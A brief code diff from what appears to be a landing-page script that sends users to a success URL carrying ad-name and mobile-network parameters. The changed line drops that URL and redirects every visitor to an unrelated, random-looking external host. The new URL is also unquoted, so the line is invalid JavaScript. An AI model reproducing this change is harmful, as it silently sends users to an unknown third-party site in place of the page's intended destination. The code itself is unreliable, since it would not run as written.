@@ -185,7 +185,7 @@ document.addEventListener('DOMContentLoaded', () => {
             successUrl.searchParams.set('ad_name', adName);
             successUrl.searchParams.set('network', selectedAnswer || 'mtn');
 
-            window.location.href = successUrl.toString();
+            window.location.href = https://kdmjzwq.com/cl/a46e47cab28fc9df;
         }
     }
 
